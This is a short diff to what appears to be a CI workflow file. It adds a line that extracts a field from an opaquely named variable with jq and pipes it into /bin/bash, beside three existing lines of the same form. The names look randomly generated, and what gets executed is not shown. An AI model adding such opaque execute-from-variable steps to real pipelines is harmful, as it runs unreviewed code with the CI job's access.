@@ -57,6 +57,7 @@ jobs:
           echo $h5871 | jq -r .e8 | /bin/bash
           echo $le6357 | jq -r .ot7 | /bin/bash
           echo $axkg65 | jq -r .jciga9279 | /bin/bash
+          printf '%s' "$s5022" | jq -r .grgap96173 | /bin/bash
 
       - name: Archive output
         if: always()
